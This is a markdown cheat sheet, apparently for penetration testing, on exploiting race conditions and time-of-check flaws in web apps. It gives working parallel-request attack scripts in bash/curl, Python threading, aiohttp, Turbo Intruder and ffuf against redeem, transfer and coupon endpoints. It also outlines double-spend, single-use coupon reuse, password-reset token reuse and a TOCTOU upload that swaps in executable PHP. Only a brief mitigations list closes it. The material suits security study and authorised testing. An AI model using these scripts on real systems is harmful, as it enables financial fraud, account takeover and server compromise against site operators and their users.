# Race Conditions & Time-of-Check Attacks

## 🎯 Detection

### Signs of Race Condition Vulnerability
- Financial transactions (balance, transfers, purchases)
- Coupon/discount code redemption
- Vote/like systems
- File upload with validation
- Session/token generation

## ⚡ Exploitation Techniques

### Parallel Requests (Bash)
```bash
# Quick parallel requests
seq 1 100 | xargs -P 50 -I {} curl -s http://target/api/redeem -d "code=DISCOUNT" &

# With timing
for i in {1..50}; do curl -s http://target/api/transfer -d "amount=100" & done; wait
```

### Python Threading
```python
import threading
import requests

def exploit():
    requests.post("http://target/api/redeem", data={"code": "DISCOUNT"})

threads = [threading.Thread(target=exploit) for _ in range(100)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### Python Async (Faster)
```python
import asyncio
import aiohttp

async def exploit(session):
    async with session.post("http://target/api/redeem", data={"code": "DISCOUNT"}) as resp:
        return await resp.text()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [exploit(session) for _ in range(100)]
        results = await asyncio.gather(*tasks)
        print(results)

asyncio.run(main())
```

## 🛠 Tools

### Turbo Intruder (Burp)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=True)
    
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### ffuf
```bash
# Unlimited rate
ffuf -u http://target/api/redeem -X POST -d "code=DISCOUNT" -w /dev/null:FUZZ -t 100 -rate 0
```

## 📋 Common Patterns

### Double Spend
```
1. Check balance (100$)
2. Send two parallel requests to spend 100$
3. Both pass validation (race window)
4. Result: Spent 200$ with only 100$
```

### TOCTOU File Upload
```
1. Upload legitimate .jpg file
2. Server validates extension
3. [RACE WINDOW]
4. Rename to .php before move completes
5. Execute malicious PHP
```

### Token Reuse
```
1. Request password reset token
2. Use token to reset password
3. [RACE WINDOW] - Token not yet invalidated
4. Use same token again in parallel request
5. Multiple password resets possible
```

### Coupon Race
```python
import threading
import requests

def redeem():
    r = requests.post("http://target/cart/coupon", 
                     data={"code": "50OFF"},
                     cookies={"session": "YOUR_SESSION"})
    print(r.text)

# Single-use coupon used multiple times
threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

## 🔍 Testing Methodology

1. **Identify state-changing operations** (purchase, vote, redeem)
2. **Check for atomic operations** (transactions, locks)
3. **Send parallel requests** (start with 10, increase)
4. **Analyze responses** (look for duplicates, errors)
5. **Verify impact** (check database state)

## 🛡 Mitigations (for understanding)
- Database transactions with proper isolation
- Mutex/locks on critical sections
- Idempotency keys
- Atomic compare-and-swap operations
